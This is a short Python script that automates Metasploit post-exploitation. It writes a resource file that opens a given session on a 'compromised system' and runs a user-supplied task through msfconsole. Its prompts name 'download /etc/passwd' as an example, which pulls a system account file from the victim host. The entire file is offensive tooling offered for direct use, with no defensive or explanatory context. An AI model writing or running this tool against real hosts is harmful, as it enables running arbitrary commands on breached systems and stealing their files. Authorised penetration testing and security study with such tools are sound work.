import subprocess
import logging

def post_exploitation(session_id, task=None):
    """
    Run customizable post-exploitation tasks on the compromised system.
    Args:
        session_id (str): Metasploit session ID for the compromised system.
        task (str): Post-exploitation task (e.g., 'getuid', 'download /etc/passwd').
    """
    task = task or input("Enter post-exploitation task (e.g., 'getuid', 'download /etc/passwd'): ")
    
    with open('post_exploitation.rc', 'w') as file:
        file.write(f"sessions -i {session_id}\n")
        file.write(f"{task}\n")

    try:
        command = ['msfconsole', '-r', 'post_exploitation.rc']
        print(f"Running post-exploitation task: {task} on session {session_id}")
        result = subprocess.run(command, capture_output=True, text=True, timeout=600)
        print(result.stdout)
        logging.info(f"Post-exploitation results: {result.stdout}")
    except subprocess.TimeoutExpired:
        print(f"Post-exploitation task on session {session_id} timed out.")
        logging.error("Post-exploitation task timed out.")
    except Exception as e:
        print(f"An error occurred: {e}")
        logging.error(f"Post-exploitation task failed with error: {e}")

if __name__ == "__main__":
    session_id = input("Enter the Metasploit session ID: ")
    task = input("Enter the post-exploitation task (optional): ")

    post_exploitation(session_id, task)
